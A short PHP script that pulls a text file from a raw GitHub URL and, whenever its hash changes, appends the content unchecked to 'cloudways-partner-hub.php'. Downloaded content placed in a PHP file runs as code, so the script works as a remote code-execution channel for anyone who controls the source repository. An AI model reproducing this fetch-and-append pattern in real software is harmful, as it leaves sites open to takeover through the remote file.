<?php
// URL of the remote TXT file
$remote_url = 'https://raw.githubusercontent.com/rmerchantDO/filter-sync/main/abc.txt';

// The PHP file you want to append into
$target_file = __DIR__ . '/cloudways-partner-hub.php';

// File to store the last known hash
$hash_file = __DIR__ . '/last_hash.txt';

// 1. Fetch remote content
$remote_content = @file_get_contents($remote_url);
if ($remote_content === false || trim($remote_content) === '') {
    exit; // Stop if fetch failed or file empty
}

// Create hash of the remote txt content
$new_hash = md5($remote_content);

// 2. Get old hash (if exists)
$old_hash = file_exists($hash_file) ? trim(file_get_contents($hash_file)) : '';

// 3. Compare hashes — if same, stop (no new update)
if ($new_hash === $old_hash) {
    exit; // No new change, do nothing
}

// 4. Append new content to cloudways-partner-hub.php
file_put_contents($target_file, "\n" . $remote_content, FILE_APPEND);

// 5. Save updated hash for next time
file_put_contents($hash_file, $new_hash);
